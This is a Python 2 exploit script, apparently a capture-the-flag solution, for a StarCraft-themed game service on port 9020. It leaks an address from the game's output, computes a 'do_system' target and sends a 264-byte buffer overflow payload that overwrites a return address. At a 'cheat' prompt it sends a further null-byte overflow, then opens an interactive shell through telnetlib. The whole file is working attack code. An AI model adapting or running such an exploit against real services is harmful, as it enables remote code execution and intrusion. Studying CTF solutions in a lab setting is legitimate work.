from socket import *
from telnetlib import *
import time, struct

p = lambda x: struct.pack("<Q", x)
up = lambda x: struct.unpack("<Q", x)[0]
flag = 0
def recvuntil(t):
	data = ''
	while not data.endswith(t):
		tmp = s.recv(1)
		if not tmp: break
		data += tmp
	return data

while True:
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(('0.0.0.0', 9020))
	print recvuntil("Ultralisk\n")
	s.send("6\n")
	data = recvuntil("*************************")
	print data
	s.send("1\n")
	while "Grrrrrr" not in data:
		data = recvuntil("******* arcon(me) *******")
		print data
		if "Stage 11 start!" in data:
			s.send("2\n")
			time.sleep(3)
			data2 = s.recv(2048)
			first = data2.split("is burrowed : ")[1]
			first = first.split("\n")[0]
			second = data2.split("is burrow-able? : ")[1]
			second = second.split("\n")[0]
			if "-" in first:
				exit_addr = (int(second)*0x100000000) + (0xffffffff-int(first)+1)
			else:
				exit_addr = (int(second)*0x100000000) + (int(first))
			do_system = exit_addr + 0x9bbd

		if "Stage 12 start!" in data:
			s.send("1\n")
			data = recvuntil("ascii artwork : ")
			s.send("A"*264 + p(do_system) + "\n")
			time.sleep(3)
			print s.recv(2048)
			flag = 1
			break

		s.send("0\n")
	if flag == 1:
		break
	s.close()

flag2 = 0
while True:
	print "Stage 12!!"
	s.send("0\n")
	time.sleep(1)
	data = s.recv(4096)
	print data
	print "--------------------------------------------------------"
	if "wanna cheat? (yes/no) : " in data and flag2 == 0:
		print "Here!!1"
		raw_input()
		s.send("yes\n")
		data = recvuntil("your command : ")
		print data
		s.send("\x00"*328 + "\n")
		time.sleep(3)
		print s.recv(4096)
		x = ''
		while x in 'y':
			s.send("1\n")
			time.sleep(2)
			print "[*] do_system : %s" % hex(do_system)
			print "---------------------------------------------------"
			print s.recv(4096)
			x = raw_input()
		t = Telnet()
		t.sock = s
		t.interact()